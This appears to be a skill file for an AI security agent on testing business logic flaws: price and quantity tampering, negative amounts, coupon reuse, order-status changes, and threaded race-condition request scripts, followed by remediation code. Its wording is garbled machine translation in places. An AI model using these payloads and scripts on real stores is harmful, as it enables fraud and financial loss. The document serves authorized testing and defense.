---
name: business-logic-testing
Professional skills and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business logic vulnerability test

## Overview

This skill provides methods for detecting, using and protecting business logic vulnerabilities.

## Vulnerability Types

### 1. Work flow around.

**Skip validation steps:**
- Direct access to final steps
- Modify Step Order
- Repeated implementation steps

### 2. Price Manipulation

**Negative prices:**
- Enter negative amount
- Increased account balance

**Price tampering:**
- Modify front end price
- Change price in request for API

### 3. Rate Limit Bypass

**Negative number:**
- Enter negative number
- May result in an increase in stocks

**Exceeding limit:**
- Modify Quantities Limit
- Batch operation bypassed

### 4. Time competition

**With request:**
- Send multiple requests simultaneously
- Overstretched a single limit

### 5. Status Operations

**Status retreat:**
- For completed orders read pending payment
- Modify order status

## Test Method

### 1. Workstream analysis

**Identification of business processes:**
- Registration process
- Purchase process
- Current process
- Audit process

**Test Step Skipped:**
```
Normal process: Step1 → Step2 → Step3
Test: Direct access steps3
Test: Step1 Step3 (Skip Step2)
```

### 2. Arguments tampering

**Modified key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # Modify To 0.01
}
```

**Negative test:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. And send out the tests.

**Requests sent simultaneously:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Send it simultaneously.10A request.
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Changes

**Modified order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # Modify to Completed
}
```

**Regressive status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # Refund from completed to pending payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative prices:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Revised front end price:**
```javascript
// Frontend Code
const price = 100.00;

// Modify To
const price = 0.01;
```

**API price revision:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # Original price100.00
      "quantity": 1
    }
  ]
}
```

### Rate Limit Bypass

**Negative number:**
```json
{
  "product_id": 123,
  "quantity": -10  # May result in an increase in stocks
}
```

**Exceeding limit:**
```json
{
  "product_id": 123,
  "quantity": 999999  # Exceeding single-purchase restrictions
}
```

### Misuse of coupons

**Reuse:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupons
```

**Unactivated coupons:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # Use of expired coupons
  "items": [...]
}
```

### Repository leaks.

**Negative presentation:**
```json
{
  "amount": -1000.00  # Possible increase in account balances
}
```

**Excess balance:**
```json
{
  "amount": 999999.00  # Excess over account balance
}
```

### Time competition

**Combined purchase:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# And send a recall #
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Front-end authentication bypass

**Direct call API:**
- bypass front JavaScript authentication
- Send API requests directly

**Request for modification:**
- Intercept with Burp Suite
- Send after changing parameters

### Status Code Analysis

**Observation response:**
- 200 OK - It might be a success.
- 400 Bad Request - Parameter Error
- 403 Forbidden - Insufficient Permissions
- 500 Internal Server Error - Server error

### Error Message Exploitation

**Information obtained from error information:**
```
Error: "Insufficit ballage, Current ballage: 100.00."
→ Access to account balance information
```

## Using the Tools

### Burp Suite

**Using Repeater:**
1. Interception of operational requests
2. Modify Key Parameters
3. Observe the Response

**Using Intruder:**
1. Tag Parameters
2. Use Payload List
3. Bulk Tests

### Custom Script

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirms that operational logic limits can be bypassed
2. Authenticate for unauthorised operations
3. Assess the impact (fund losses, data manipulation, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Gap locations and business processes
- Executable Unauthorized Operation
- the complete exploitation steps andPoC
- Remediation recommendations (service-end validation, business rule inspection, etc.)

## Preventive Measures

### Recommended Approach

1. **Server-side validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Get real prices from the database
       real_price = db.get_product_price(product_id)

       # Authentication price
       if price != real_price:
           raise ValueError("Price mismatch")

       # Number of authentications
       if quantity <= 0:
           raise ValueError("Invalid quantity")

       # Processing of purchases
       process_order(product_id, quantity, real_price)
   ```

2. **State Machine Authentication**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"

       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }

       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency Control**
   ```python
   import threading

   lock = threading.Lock()

   def process_order(order_id):
       with lock:
           # Check order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")

           # Processing of orders
           process(order)
   ```

4. **Certification of business rules**
   ```python
   def validate_business_rules(order):
       # Authentication Quantities Limit
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")

       # Validate price ranges
       if order.price <= 0:
           raise ValueError("Invalid price")

       # Validate inventory
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit log**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Important Notes

- Perform only in an authorized testing environment
- Avoiding operational impact
- Pay attention to differences in business processes
- Pay attention to data consistency when testing